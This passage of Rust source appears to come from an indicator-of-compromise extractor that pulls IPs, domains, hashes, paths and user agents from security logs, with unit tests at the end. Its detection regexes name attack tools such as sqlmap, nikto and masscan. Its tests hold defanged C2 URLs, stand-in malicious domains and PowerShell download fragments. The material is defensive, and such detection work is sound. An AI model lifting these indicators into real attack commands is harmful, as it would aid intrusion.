static RE_EMAIL: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"(?i)\b[a-z0-9][a-z0-9._%+-]{0,63}@(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}\b",
    )
});
static RE_UA: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"(?i)\b(?:mozilla/[45]\.0|(?:curl|wget|python-requests|python-urllib[0-9.]*|go-http-client|okhttp|libwww-perl|windowspowershell|microsoft-cryptoapi|microsoft bits|sqlmap|masscan|zgrab|nikto|nuclei|java)/[0-9][A-Za-z0-9._+-]*)",
    )
});
static RE_UA_PRODUCT: LazyLock<Regex> =
    LazyLock::new(|| re(r"^[A-Za-z][A-Za-z0-9_.!+-]*/[A-Za-z0-9_.+-]+"));
static RE_UA_WORD: LazyLock<Regex> = LazyLock::new(|| re(r"^[A-Za-z]+"));
static RE_REGISTRY: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r#"(?i)\b(?:hklm|hkcu|hkcr|hku|hkcc|hkey_local_machine|hkey_current_user|hkey_classes_root|hkey_users|hkey_current_config)\\[^"'\r\n\t|<>]+|\\registry\\(?:machine|user|a)\\[^"'\r\n\t|<>]+"#,
    )
});
static RE_WINPATH: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r#"(?i)(?:\b[a-z]:\\|\\\\[a-z0-9_.$-]+\\|%[a-z_][a-z0-9_()]*%\\|\\(?:device|systemroot|\?\?)\\)[^"'\r\n\t|<>*?;,]*"#,
    )
});
static RE_UNIXPATH: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r#"(?:^|[\s"'=(,:;])(/(?:tmp|etc|bin|sbin|usr|var|dev|home|root|opt|proc|sys|lib|lib32|lib64|mnt|media|srv|run|boot|Users|Library|Applications|private)(?:/[A-Za-z0-9._@%+~-]+)+/?)"#,
    )
});
static RE_CVE: LazyLock<Regex> = LazyLock::new(|| re(r"(?i)\bcve-([0-9]{4})-([0-9]{4,7})\b"));
static RE_MITRE: LazyLock<Regex> = LazyLock::new(|| re(r"\bT1[0-9]{3}(?:\.[0-9]{3})?\b"));
static RE_IPV6: LazyLock<Regex> =
    LazyLock::new(|| re(r"(?i)[0-9a-f:]*:[0-9a-f:]*:[0-9a-f:.]*(?:%[0-9a-z]+)?"));
static RE_IPV4: LazyLock<Regex> =
    LazyLock::new(|| re(r"\b[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\b"));
static RE_DOMAIN: LazyLock<Regex> = LazyLock::new(|| {
    re(r"(?i)\b(?:[a-z0-9_](?:[a-z0-9_-]{0,61}[a-z0-9_])?\.)+(?:[a-z]{2,63}|xn--[a-z0-9-]{1,59})\b")
});
static RE_HEX: LazyLock<Regex> = LazyLock::new(|| re(r"\b[0-9a-fA-F]{32,128}\b"));

fn scan_value(text: &str, hint: Hint) -> Vec<Found> {
    let mut out = Vec::new();
    match hint {
        Hint::Skip => {}
        Hint::Domain => {
            let v = text.trim().trim_end_matches('.').to_ascii_lowercase();
            if let Ok(ip) = v.parse::<IpAddr>() {
                push_ip(ip, &mut out);
            } else if let Some(ip) = reverse_dns_ipv4(&v) {
                out.push(
                    Found::new(IocType::Ipv4, ip.to_string())
                        .scoped(classify_ipv4(ip))
                        .noted("from reverse DNS (PTR) query"),
                );
            } else if is_valid_hostname(&v) && !v.ends_with(".arpa") {
                let scope = domain_scope(&v);
                let mut f = Found::new(IocType::Domain, v.clone()).scoped(scope);
                if v.ends_with(".onion") {
                    f = f.noted("Tor hidden service");
                }
                out.push(f);
            } else {
                scan_generic(text, true, true, &mut out);
            }
        }
        Hint::Path => {
            let v = text.trim().trim_matches('"');
            if let Some(f) = (!has_cli_args(v)).then(|| whole_path(v)).flatten() {
                if let Some(h) = unc_host(&f.value) {
                    out.extend(h);
                }
                out.push(f);
            } else {
                scan_generic(text, true, true, &mut out);
            }
        }
        Hint::Registry => {
            let v = text.trim();
            let l = v.to_ascii_lowercase();
            if l.starts_with("hk") || l.starts_with("\\registry\\") {
                out.push(Found::new(IocType::RegistryKey, v));
            } else {
                scan_generic(text, true, true, &mut out);
            }
        }
        Hint::UserAgent => {
            let v = text.trim();
            if !v.is_empty() && v.len() <= 1024 && v != "-" {
                out.push(Found::new(IocType::UserAgent, v));
            }
        }
        Hint::HashOf(t) => {
            let v = text.trim().to_ascii_lowercase();
            if is_hex(&v) && hash_type_for_len(v.len(), Some(t)) == Some(t) {
                out.push(Found::new(t, v));
            } else {
                scan_generic(text, false, true, &mut out);
            }
        }
        Hint::Hashes => scan_generic(text, false, true, &mut out),
        Hint::NoNetwork => scan_generic(text, false, true, &mut out),
        Hint::NoHash => scan_generic(text, true, false, &mut out),
        Hint::Generic => scan_generic(text, true, true, &mut out),
    }
    out
}

fn is_hex(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_hexdigit())
}

fn hash_type_for_len(len: usize, prefer: Option<IocType>) -> Option<IocType> {
    match (len, prefer) {
        (32, Some(IocType::Imphash)) => Some(IocType::Imphash),
        (32, _) => Some(IocType::Md5),
        (40, _) => Some(IocType::Sha1),
        (64, _) => Some(IocType::Sha256),
        (128, _) => Some(IocType::Sha512),
        _ => None,
    }
}

/// Reject hex strings that are far more likely ids/counters than digests.
fn plausible_digest(h: &str) -> bool {
    let has_digit = h.chars().any(|c| c.is_ascii_digit());
    let has_alpha = h.chars().any(|c| c.is_ascii_alphabetic());
    let distinct: BTreeSet<char> = h.chars().map(|c| c.to_ascii_lowercase()).collect();
    has_digit && has_alpha && distinct.len() >= 6
}

fn push_ip(ip: IpAddr, out: &mut Vec<Found>) {
    match ip {
        IpAddr::V4(v4) => {
            out.push(Found::new(IocType::Ipv4, v4.to_string()).scoped(classify_ipv4(v4)))
        }
        IpAddr::V6(v6) => {
            if let Some(v4) = v6.to_ipv4_mapped() {
                out.push(Found::new(IocType::Ipv4, v4.to_string()).scoped(classify_ipv4(v4)));
            } else {
                out.push(Found::new(IocType::Ipv6, v6.to_string()).scoped(classify_ipv6(v6)));
            }
        }
    }
}

fn push_host(host: &str, out: &mut Vec<Found>) {
    let h = host.trim_end_matches('.').to_ascii_lowercase();
    if let Ok(ip) = h.trim_matches(|c| c == '[' || c == ']').parse::<IpAddr>() {
        push_ip(ip, out);
    } else if is_valid_hostname(&h) {
        out.push(Found::new(IocType::Domain, h.clone()).scoped(domain_scope(&h)));
    }
}

fn host_scope(host: &str) -> Scope {
    let h = host.trim_end_matches('.').to_ascii_lowercase();
    match h.trim_matches(|c| c == '[' || c == ']').parse::<IpAddr>() {
        Ok(ip) => classify_ip(ip),
        Err(_) if h.contains('.') => domain_scope(&h),
        Err(_) => Scope::Internal,
    }
}

fn trim_trailing_punct(s: &str) -> &str {
    let mut end = s.len();
    loop {
        let cur = &s[..end];
        let Some(c) = cur.chars().next_back() else {
            break;
        };
        let strip = match c {
            '.' | ',' | ';' | ':' | '!' | '?' | '\'' | '"' | '>' | '}' | ']' => true,
            ')' => cur.matches('(').count() < cur.matches(')').count(),
            _ => false,
        };
        if !strip {
            break;
        }
        end -= c.len_utf8();
    }
    &s[..end]
}

fn has_extension(segment: &str) -> bool {
    match trim_trailing_punct(segment).rsplit_once('.') {
        Some((stem, ext)) => {
            !stem.is_empty()
                && (1..=5).contains(&ext.len())
                && ext.chars().all(|c| c.is_ascii_alphanumeric())
        }
        None => false,
    }
}

fn looks_like_new_path(t: &str) -> bool {
    let b = t.as_bytes();
    (b.len() >= 3 && b[0].is_ascii_alphabetic() && b[1] == b':' && b[2] == b'\\')
        || t.starts_with("\\\\")
        || t.starts_with('%')
        || t.to_ascii_lowercase().starts_with("hk")
}

/// Paths and registry keys may contain spaces (`C:\Program Files (x86)\..`);
/// cut a greedy candidate at the most plausible end: continue across a space
/// only while the current segment has no extension and a following token
/// (within three word-like tokens) contains a backslash.
fn trim_spaced_path(raw: &str) -> &str {
    let mut tokens: Vec<(usize, &str)> = Vec::new();
    let mut pos = 0;
    for t in raw.split(' ') {
        tokens.push((pos, t));
        pos += t.len() + 1;
    }
    let Some(&(_, first)) = tokens.first() else {
        return raw;
    };
    let mut end = first.len();
    let mut last_has_ext = has_extension(first.rsplit('\\').next().unwrap_or(first));
    let mut i = 1;
    while i < tokens.len() && !last_has_ext {
        let mut found = None;
        let mut j = i;
        while j < tokens.len() && j < i + 3 {
            let t = tokens[j].1;
            if t.is_empty() || t.starts_with('-') || t.starts_with('/') || looks_like_new_path(t) {
                break;
            }
            if t.contains('\\') {
                found = Some(j);
                break;
            }
            if !t
                .chars()
                .all(|c| c.is_alphanumeric() || "()_-.&+'#~!$".contains(c))
            {
                break;
            }
            j += 1;
        }
        match found {
            Some(j) => {
                let (p, t) = tokens[j];
                end = p + t.len();
                last_has_ext = has_extension(t.rsplit('\\').next().unwrap_or(t));
                i = j + 1;
            }
            None => break,
        }
    }
    &raw[..end]
}

fn collapse_escaped_backslashes(p: &str) -> String {
    if !p.contains("\\\\") {
        return p.to_string();
    }
    let (prefix, rest) = if let Some(r) = p.strip_prefix("\\\\\\\\") {
        ("\\\\", r)
    } else if let Some(r) = p.strip_prefix("\\\\") {
        ("\\\\", r)
    } else {
        ("", p)
    };
    let mut out = String::from(prefix);
    let mut prev_bs = false;
    for c in rest.chars() {
        if c == '\\' {
            if !prev_bs {
                out.push(c);
            }
            prev_bs = true;
        } else {
            prev_bs = false;
            out.push(c);
        }
    }
    out
}

fn is_windows_path_start(v: &str) -> bool {
    let b = v.as_bytes();
    let l = v.to_ascii_lowercase();
    (b.len() >= 3 && b[0].is_ascii_alphabetic() && b[1] == b':' && b[2] == b'\\')
        || v.starts_with("\\\\")
        || (v.starts_with('%') && v[1..].contains("%\\"))
        || l.starts_with("\\device\\")
        || l.starts_with("\\systemroot\\")
        || l.starts_with("\\??\\")
}

/// `true` when a value carries quotes or command-line switches
/// (`"C:\x\a.exe" -service`), i.e. it is a command, not a bare path.
fn has_cli_args(v: &str) -> bool {
    let b = v.as_bytes();
    v.contains('"')
        || b.windows(3).any(|w| {
            w[0].is_ascii_whitespace()
                && (w[1] == b'-' || w[1] == b'/')
                && w[2].is_ascii_alphabetic()
        })
}

/// A field value that is a path as a whole.
fn whole_path(v: &str) -> Option<Found> {
    if v.len() < 4 || v.len() > 1024 {
        return None;
    }
    if is_windows_path_start(v) {
        return Some(Found::new(
            IocType::WindowsPath,
            collapse_escaped_backslashes(v),
        ));
    }
    if v.starts_with('/') && v[1..].contains('/') && !v.contains(char::is_whitespace) {
        return Some(Found::new(IocType::UnixPath, v));
    }
    None
}

/// Host of a UNC path (`\\10.0.0.5\c$` → IP, `\\fs01.corp.local\share` → domain).
fn unc_host(p: &str) -> Option<Vec<Found>> {
    let rest = p.strip_prefix("\\\\")?;
    let host = rest.split('\\').next()?;
    if host.is_empty() || host == "." || host == "?" {
        return None;
    }
    let mut out = Vec::new();
    push_host(host, &mut out);
    Some(out)
}

/// Next search position after a (possibly trimmed) match; always advances
/// by at least one character and stays on a char boundary.
fn next_pos(text: &str, start: usize, end: usize) -> usize {
    if end > start {
        end
    } else {
        start + text[start..].chars().next().map_or(1, char::len_utf8)
    }
}

/// Extend a user-agent match over the following `product/version` tokens and
/// `(comment)` groups (`Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 ...`).
fn ua_end(text: &str, mut end: usize) -> usize {
    while let Some(rest) = text[end..].strip_prefix(' ') {
        let base = end + 1;
        if rest.starts_with('(') {
            let mut depth = 0usize;
            let mut close = None;
            for (i, c) in rest.char_indices() {
                match c {
                    '(' => depth += 1,
                    ')' => {
                        depth = depth.saturating_sub(1);
                        if depth == 0 {
                            close = Some(i);
                            break;
                        }
                    }
                    '"' | '\r' | '\n' | '\t' => break,
                    _ => {}
                }
            }
            match close {
                Some(i) => end = base + i + 1,
                None => break,
            }
        } else if let Some(m) = RE_UA_PRODUCT.find(rest) {
            end = base + m.end();
        } else if let Some(w) = RE_UA_WORD.find(rest) {
            // `Mobile Safari/537.36`: a bare word followed by a product token.
            let after = &rest[w.end()..];
            match after.strip_prefix(' ').and_then(|a| RE_UA_PRODUCT.find(a)) {
                Some(p) => end = base + w.end() + 1 + p.end(),
                None => break,
            }
        } else {
            break;
        }
    }
    end
}

const NOISE_UNIX_PATHS: &[&str] = &[
    "/dev/null",
    "/dev/zero",
    "/dev/random",
    "/dev/urandom",
    "/dev/stdin",
    "/dev/stdout",
    "/dev/stderr",
    "/dev/tty",
];

fn ipv4_context_rejects(text: &str, start: usize, end: usize) -> bool {
    let before = &text[..start];
    let after = &text[end..];
    let mut ac = after.chars();
    let a0 = ac.next();
    let a1 = ac.next();
    // Longer dotted sequence (1.2.3.4.5, OIDs) or `1.2.3.4.in-addr.arpa`.
    if a0 == Some('.') && a1.is_some_and(|c| c.is_ascii_alphanumeric()) {
        return true;
    }
    let mut bc = before.chars().rev();
    let b0 = bc.next();
    let b1 = bc.next();
    if b0 == Some('.') && b1.is_some_and(|c| c.is_ascii_alphanumeric()) {
        return true;
    }
    // Product/version tokens: `Chrome/120.0.0.0`, `rv:109.0.0.1`.
    if b0 == Some('/') && b1.is_some_and(|c| c.is_ascii_alphabetic()) {
        return true;
    }
    let tail: String = before
        .chars()
        .rev()
        .take(24)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect();
    let tail = tail
        .trim_end_matches(|c: char| c.is_whitespace() || matches!(c, '=' | ':' | '"' | '\''))
        .to_ascii_lowercase();
    [
        "version",
        "ver",
        "build",
        "release",
        "fileversion",
        "productversion",
        " v",
    ]
    .iter()
    .any(|w| tail.ends_with(w))
}

fn scan_generic(text: &str, allow_network: bool, allow_hash: bool, out: &mut Vec<Found>) {
    let mut spans = Spans::default();

    // 1. Labelled hashes (Sysmon `SHA256=..,MD5=..,IMPHASH=..`).
    for c in RE_LABELED_HASH.captures_iter(text) {
        let (Some(label), Some(val)) = (c.get(1), c.get(2)) else {
            continue;
        };
        spans.add(val.start(), val.end());
        if !allow_hash {
            continue;
        }
        let v = val.as_str().to_ascii_lowercase();
        let want = match label
            .as_str()
            .to_ascii_lowercase()
            .replace('-', "")
            .as_str()
        {
            "md5" => IocType::Md5,
            "sha1" => IocType::Sha1,
            "sha256" => IocType::Sha256,
            "sha512" => IocType::Sha512,
            _ => IocType::Imphash,
        };
        if hash_type_for_len(v.len(), Some(want)) == Some(want) {
            out.push(Found::new(want, v));
        }
    }

    // 2. URLs (+ host as domain/IP).
    if allow_network {
        for m in RE_URL.find_iter(text) {
            let cand = trim_trailing_punct(m.as_str());
            if cand.len() > 4096 {
                continue;
            }
            let Ok(url) = url::Url::parse(cand) else {
                continue;
            };
            let Some(host) = url.host_str().map(str::to_string) else {
                continue;
            };
            if host.is_empty() {
                continue;
            }
            spans.add(m.start(), m.start() + cand.len());
            let scope = host_scope(&host);
            let raw_host = cand
                .split_once("://")
                .map(|(_, r)| r.split(['/', '?', '#', ':']).next().unwrap_or(""))
                .unwrap_or("");
            let mut f = Found::new(IocType::Url, cand).scoped(scope);
            let host_is_ip = host
                .trim_matches(|c| c == '[' || c == ']')
                .parse::<IpAddr>()
                .is_ok();
            if host_is_ip && raw_host.parse::<IpAddr>().is_err() && !raw_host.starts_with('[') {
                f = f.noted(format!("obfuscated IP host normalised to {host}"));
            }
            out.push(f);
            push_host(&host, out);
        }
    }

    // 3. User agents (may overlap URLs, e.g. bot UAs).
    for m in RE_UA.find_iter(text) {
        if text[..m.start()].ends_with('/') {
            continue;
        }
        let end = ua_end(text, m.end());
        spans.add(m.start(), end);
        out.push(Found::new(IocType::UserAgent, &text[m.start()..end]));
    }

    // 4. E-mails.
    if allow_network {
        for m in RE_EMAIL.find_iter(text) {
            if spans.overlaps(m.start(), m.end()) {
                continue;
            }
            let v = m.as_str().to_ascii_lowercase();
            let Some((local, domain)) = v.split_once('@') else {
                continue;
            };
            if local.len() > 64 || !is_valid_hostname(domain) {
                continue;
            }
            let tld_known = domain.rsplit('.').next().is_some_and(tld::is_known_tld);
            if !tld_known && !tld::is_internal_name(domain) {
                continue;
            }
            let scope = domain_scope(domain);
            spans.add(m.start(), m.end());
            out.push(Found::new(IocType::Email, v.clone()).scoped(scope));
        }
    }

    // 5. Registry keys.
    let mut pos = 0;
    while let Some(m) = RE_REGISTRY.find_at(text, pos) {
        let quoted = text[..m.start()].ends_with(['"', '\'']);
        let raw = if quoted {
            m.as_str().trim_end()
        } else {
            trim_spaced_path(m.as_str())
        };
        let end = m.start() + raw.len();
        pos = next_pos(text, m.start(), end);
        if spans.overlaps(m.start(), end) {
            continue;
        }
        let v = trim_trailing_punct(raw).trim_end_matches('\\');
        if v.len() < 6 {
            continue;
        }
        spans.add(m.start(), end);
        out.push(Found::new(
            IocType::RegistryKey,
            collapse_escaped_backslashes(v),
        ));
    }

    // 6. Windows paths (+ UNC host).
    let mut pos = 0;
    while let Some(m) = RE_WINPATH.find_at(text, pos) {
        let quoted = text[..m.start()].ends_with(['"', '\'']);
        let raw = if quoted {
            m.as_str().trim_end()
        } else {
            trim_spaced_path(m.as_str())
        };
        let end = m.start() + raw.len();
        pos = next_pos(text, m.start(), end);
        if spans.overlaps(m.start(), end) {
            continue;
        }
        let v = collapse_escaped_backslashes(trim_trailing_punct(raw));
        if v.len() <= 3 || v.ends_with(":\\") {
            continue;
        }
        spans.add(m.start(), end);
        if allow_network {
            if let Some(h) = unc_host(&v) {
                out.extend(h);
            }
        }
        out.push(Found::new(IocType::WindowsPath, v));
    }

    // 7. Unix paths.
    for c in RE_UNIXPATH.captures_iter(text) {
        let Some(m) = c.get(1) else { continue };
        if spans.overlaps(m.start(), m.end()) {
            continue;
        }
        let v = trim_trailing_punct(m.as_str());
        spans.add(m.start(), m.end());
        if NOISE_UNIX_PATHS.contains(&v) {
            continue;
        }
        out.push(Found::new(IocType::UnixPath, v));
    }

    // 8. CVEs.
    for c in RE_CVE.captures_iter(text) {
        let (Some(m), Some(year)) = (c.get(0), c.get(1)) else {
            continue;
        };
        let y: u32 = year.as_str().parse().unwrap_or(0);
        if !(1999..=2100).contains(&y) {
            continue;
        }
        out.push(Found::new(IocType::Cve, m.as_str().to_ascii_uppercase()));
    }

    // 9. MITRE technique ids.
    for m in RE_MITRE.find_iter(text) {
        if spans.overlaps(m.start(), m.end()) {
            continue;
        }
        let id = m.as_str();
        let mut f = Found::new(IocType::MitreTechnique, id);
        if let Some(t) = crate::mitre::technique(id) {
            f = f.noted(t.name);
        }
        out.push(f);
    }

    if allow_network {
        // 10. IPv6 (IPv4-mapped reported as IPv4).
        for m in RE_IPV6.find_iter(text) {
            let (s, e) = (m.start(), m.end());
            if spans.overlaps(s, e) {
                continue;
            }
            let before = text[..s].chars().next_back();
            let after = text[e..].chars().next();
            if before.is_some_and(|c| c.is_ascii_alphanumeric() || matches!(c, ':' | '.' | '_'))
                || after.is_some_and(|c| c.is_ascii_alphanumeric() || c == '_')
            {
                continue;
            }
            let cand = m.as_str().trim_end_matches('.');
            let addr = cand.split('%').next().unwrap_or(cand);
            // Real addresses contain digits; `::Add(` style .NET calls do not.
            if addr.matches(':').count() < 2 || !addr.chars().any(|c| c.is_ascii_digit()) {
                continue;
            }
            let Ok(ip) = Ipv6Addr::from_str(addr) else {
                continue;
            };
            if ip.is_unspecified() {
                spans.add(s, e);
                continue;
            }
            spans.add(s, e);
            push_ip(IpAddr::V6(ip), out);
        }

        // 11. IPv4.
        for m in RE_IPV4.find_iter(text) {
            let (s, e) = (m.start(), m.end());
            if spans.overlaps(s, e) || ipv4_context_rejects(text, s, e) {
                continue;
            }
            let mut octets = [0u8; 4];
            let mut ok = true;
            for (i, p) in m.as_str().split('.').enumerate() {
                match (i < 4).then(|| parse_octet(p)).flatten() {
                    Some(o) => octets[i] = o,
                    None => {
                        ok = false;
                        break;
                    }
                }
            }
            if !ok {
                continue;
            }
            spans.add(s, e);
            let ip = Ipv4Addr::from(octets);
            out.push(Found::new(IocType::Ipv4, ip.to_string()).scoped(classify_ipv4(ip)));
        }

        // 12. Domains.
        for m in RE_DOMAIN.find_iter(text) {
            let (s, e) = (m.start(), m.end());
            if spans.overlaps(s, e) {
                continue;
            }
            let original = m.as_str();
            let lower = original.to_ascii_lowercase();
            if let Some(ip) = reverse_dns_ipv4(&lower) {
                spans.add(s, e);
                out.push(
                    Found::new(IocType::Ipv4, ip.to_string())
                        .scoped(classify_ipv4(ip))
                        .noted("from reverse DNS (PTR) query"),
                );
                continue;
            }
            if lower.ends_with(".arpa") || !accept_text_domain(original, text, s, e) {
                continue;
            }
            spans.add(s, e);
            let mut f = Found::new(IocType::Domain, lower.clone()).scoped(domain_scope(&lower));
            if lower.ends_with(".onion") {
                f = f.noted("Tor hidden service");
            }
            out.push(f);
        }
    }

    // 13. Bare hashes.
    if allow_hash {
        for m in RE_HEX.find_iter(text) {
            let (s, e) = (m.start(), m.end());
            if spans.overlaps(s, e) {
                continue;
            }
            let v = m.as_str().to_ascii_lowercase();
            let before = text[..s].chars().next_back();
            let after = text[e..].chars().next();
            // GUID fragments / dashed ids.
            if before == Some('-') || after == Some('-') {
                continue;
            }
            let Some(t) = hash_type_for_len(v.len(), None) else {
                continue;
            };
            if !plausible_digest(&v) {
                continue;
            }
            out.push(Found::new(t, v));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn values(r: &IocReport, t: IocType) -> Vec<String> {
        r.of_type(t).map(|i| i.value.clone()).collect()
    }

    #[test]
    fn all_static_regexes_compile() {
        for r in [
            &RE_HXXP,
            &RE_FXP,
            &RE_BRACKET,
            &RE_LABELED_HASH,
            &RE_URL,
            &RE_EMAIL,
            &RE_UA,
            &RE_UA_PRODUCT,
            &RE_UA_WORD,
            &RE_REGISTRY,
            &RE_WINPATH,
            &RE_UNIXPATH,
            &RE_CVE,
            &RE_MITRE,
            &RE_IPV6,
            &RE_IPV4,
            &RE_DOMAIN,
            &RE_HEX,
        ] {
            LazyLock::force(r);
        }
    }

    #[test]
    fn ipv4_validation_and_classification() {
        let r = extract_from_text(
            "conn 8.8.8.8 -> 10.1.2.3, 192.168.1.10, 172.20.0.1, 127.0.0.1, 169.254.1.1, \
             100.64.0.1, 203.0.113.9, 224.0.0.251, 255.255.255.255, 256.1.1.1, 01.2.3.4",
        );
        let ips = values(&r, IocType::Ipv4);
        assert!(!ips.contains(&"256.1.1.1".to_string()));
        assert!(!ips.iter().any(|i| i.starts_with("01.") || i == "1.2.3.4"));
        let scope = |v: &str| r.find(IocType::Ipv4, v).and_then(|i| i.scope);
        assert_eq!(scope("8.8.8.8"), Some(Scope::Public));
        assert_eq!(scope("10.1.2.3"), Some(Scope::Private));
        assert_eq!(scope("192.168.1.10"), Some(Scope::Private));
        assert_eq!(scope("172.20.0.1"), Some(Scope::Private));
        assert_eq!(scope("127.0.0.1"), Some(Scope::Loopback));
        assert_eq!(scope("169.254.1.1"), Some(Scope::LinkLocal));
        assert_eq!(scope("100.64.0.1"), Some(Scope::SharedAddressSpace));
        assert_eq!(scope("203.0.113.9"), Some(Scope::Documentation));
        assert_eq!(scope("224.0.0.251"), Some(Scope::Multicast));
        assert_eq!(scope("255.255.255.255"), Some(Scope::Broadcast));
        assert_eq!(classify_ipv4(Ipv4Addr::new(172, 32, 0, 1)), Scope::Public);
        assert_eq!(classify_ipv4(Ipv4Addr::new(198, 18, 0, 1)), Scope::Reserved);
        assert_eq!(classify_ipv4(Ipv4Addr::new(0, 0, 0, 0)), Scope::Unspecified);
        assert_eq!(classify_ipv4(Ipv4Addr::new(240, 0, 0, 1)), Scope::Reserved);
    }

    #[test]
    fn version_strings_are_not_ips() {
        let r = extract_from_text(
            "FileVersion: 10.0.19041.1 (WinBuild.160101.0800) ProductVersion 10.0.19041.746 \
             System.Management.Automation, Version=3.0.0.0, Culture=neutral \
             Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36 \
             OID 1.3.6.1.4.1.311.21.8 version 2.1.0.4",
        );
        assert!(values(&r, IocType::Ipv4).is_empty(), "{:?}", r.iocs);
        assert!(values(&r, IocType::Domain).is_empty(), "{:?}", r.iocs);
    }

    #[test]
    fn file_names_and_namespaces_are_not_domains() {
        let r = extract_from_text(
            "C:\\Windows\\System32\\svchost.exe -k netsvcs loaded ntdll.dll kernel32.dll \
             System.Management.Automation.dll; [System.Net.WebClient]::new(); \
             [System.IO.File]::ReadAllBytes($p); System.IO; python setup.py install; \
             tar xf update.zip; ./deploy.sh; rule.id agent.name data.win.eventdata.image \
             $client.DownloadString; subprocess.run([...]); README.md lib.so",
        );
        assert!(
            values(&r, IocType::Domain).is_empty(),
            "{:?}",
            values(&r, IocType::Domain)
        );
    }

    #[test]
    fn real_domains_are_found() {
        let r = extract_from_text(
            "nslookup evil-c2.xyz; ping update.windowsupdate.com; beacon to a1b2c3.duckdns.org \
             and files.evil.zip and EXAMPLE.COM and tor abcdefghijklmnop.onion",
        );
        let d = values(&r, IocType::Domain);
        for want in [
            "evil-c2.xyz",
            "update.windowsupdate.com",
            "a1b2c3.duckdns.org",
            "files.evil.zip",
            "example.com",
            "abcdefghijklmnop.onion",
        ] {
            assert!(d.contains(&want.to_string()), "missing {want} in {d:?}");
        }
        let onion = r.find(IocType::Domain, "abcdefghijklmnop.onion");
        assert_eq!(
            onion.and_then(|i| i.note.as_deref()),
            Some("Tor hidden service")
        );
        assert!(
            r.iocs
                .iter()
                .all(|i| i.ioc_type != IocType::Domain || i.is_external())
        );
    }

    #[test]
    fn refang_defanged_indicators() {
        let raw = "C2: hxxps://bad-domain[.]com/payload.bin and 45[.]33[.]32[.]156 \
                   mail: phish[@]evil(dot)ru ip 8.8.8.8";
        let r = extract_from_text(raw);
        let url = r.find(IocType::Url, "https://bad-domain.com/payload.bin");
        assert!(url.is_some_and(|u| u.defanged), "{:?}", r.iocs);
        assert!(
            r.find(IocType::Domain, "bad-domain.com")
                .is_some_and(|d| d.defanged)
        );
        assert!(
            r.find(IocType::Ipv4, "45.33.32.156")
                .is_some_and(|i| i.defanged)
        );
        assert!(
            r.find(IocType::Email, "phish@evil.ru")
                .is_some_and(|i| i.defanged)
        );
        assert!(
            r.find(IocType::Ipv4, "8.8.8.8")
                .is_some_and(|i| !i.defanged)
        );
        assert_eq!(refang("hXXp://a[.]b(.)c{.}d [dot] e"), "http://a.b.c.d.e");
        assert!(matches!(refang("plain text 1.2.3.4"), Cow::Borrowed(_)));
    }

    #[test]
    fn defang_values() {
        assert_eq!(
            defang("https://evil.com/a.b", IocType::Url),
            "hxxps://evil[.]com/a.b"
        );
        assert_eq!(defang("1.2.3.4", IocType::Ipv4), "1[.]2[.]3[.]4");
        assert_eq!(defang("a@b.com", IocType::Email), "a[@]b[.]com");
        assert_eq!(defang("C:\\x.exe", IocType::WindowsPath), "C:\\x.exe");
    }

    #[test]
    fn sysmon_hashes_are_labelled() {
        let ev = json!({"data": {"win": {"eventdata": {
            "hashes": "SHA1=3F64C98F22DA277A07CAB248C44C56EEDB796A81,MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=D8B2B1D0A2E8B47E4F4F48C26F0B9F0B3A60C5E3D7A2C95FE9D5D6B9B6C8E4A1,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744"
        }}}});
        let r = extract_from_json(&ev);
        assert_eq!(
            values(&r, IocType::Sha1),
            vec!["3f64c98f22da277a07cab248c44c56eedb796a81"]
        );
        assert_eq!(
            values(&r, IocType::Md5),
            vec!["a575a7610e5f003cc36df39e07c4ba7d"]
        );
        assert_eq!(
            values(&r, IocType::Imphash),
            vec!["f34d5f2d4577ed6d9ceec516c1f5a744"]
        );
        assert_eq!(values(&r, IocType::Sha256).len(), 1);
        let md5 = r.of_type(IocType::Md5).next();
        assert_eq!(
            md5.map(|i| i.sources.clone()),
            Some(vec!["data.win.eventdata.hashes".to_string()])
        );
    }

    #[test]
    fn bare_hashes_and_false_hex() {
        let r = extract_from_text(
            "sample 44d88612fea8a8f36de82e1278abb02f seen; id 00000000000000000000000000000000; \
             counter 12345678901234567890123456789012; guid {6a1b2c3d-1111-2222-3333-444455556666}",
        );
        assert_eq!(
            values(&r, IocType::Md5),
            vec!["44d88612fea8a8f36de82e1278abb02f"]
        );
        assert!(values(&r, IocType::Sha1).is_empty());
    }

    #[test]
    fn ipv6_extraction() {
        let r = extract_from_text(
            "src fe80::1%12 dst 2606:4700:4700::1111 mapped ::ffff:93.184.216.34; time 12:30:45 \
             mac 00:1a:2b:3c:4d:5e [System.Convert]::FromBase64String std::string doc 2001:db8::5",
        );
        let v6 = values(&r, IocType::Ipv6);
        assert!(v6.contains(&"fe80::1".to_string()), "{v6:?}");
        assert!(v6.contains(&"2606:4700:4700::1111".to_string()));
        assert!(v6.contains(&"2001:db8::5".to_string()));
        assert_eq!(v6.len(), 3, "{v6:?}");
        assert_eq!(
            r.find(IocType::Ipv6, "2606:4700:4700::1111")
                .and_then(|i| i.scope),
            Some(Scope::Public)
        );
        assert_eq!(
            r.find(IocType::Ipv6, "fe80::1").and_then(|i| i.scope),
            Some(Scope::LinkLocal)
        );
        assert_eq!(values(&r, IocType::Ipv4), vec!["93.184.216.34"]);
        assert_eq!(classify_ipv6("fd00::1".parse().unwrap()), Scope::Private);
        assert_eq!(classify_ipv6("ff02::1".parse().unwrap()), Scope::Multicast);
        assert_eq!(classify_ipv6("::1".parse().unwrap()), Scope::Loopback);
        assert_eq!(
            classify_ipv6("64:ff9b::808:808".parse().unwrap()),
            Scope::Public
        );
        assert_eq!(
            classify_ipv6("64:ff9b::a00:1".parse().unwrap()),
            Scope::Private
        );
    }

    #[test]
    fn urls_and_hosts() {
        let r = extract_from_text(
